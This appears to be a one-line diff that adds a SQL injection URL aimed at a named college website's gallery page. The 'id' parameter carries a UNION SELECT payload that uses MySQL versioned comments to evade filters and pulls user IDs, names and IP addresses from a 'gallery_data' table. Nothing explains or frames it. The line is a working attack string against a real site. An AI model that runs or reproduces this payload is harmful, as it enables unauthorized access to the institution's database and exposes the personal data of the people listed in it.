@@ -1,0 +1,1 @@
+http://www.maheshwaricollege.ac.in/gallery.php?id=-54' /*!50000union+*/select  /*!50000concat*/(user_id,0x3d3d,name,0x3d3d,ip),2,3,4,5 /*!50000from+*/gallery_data --+
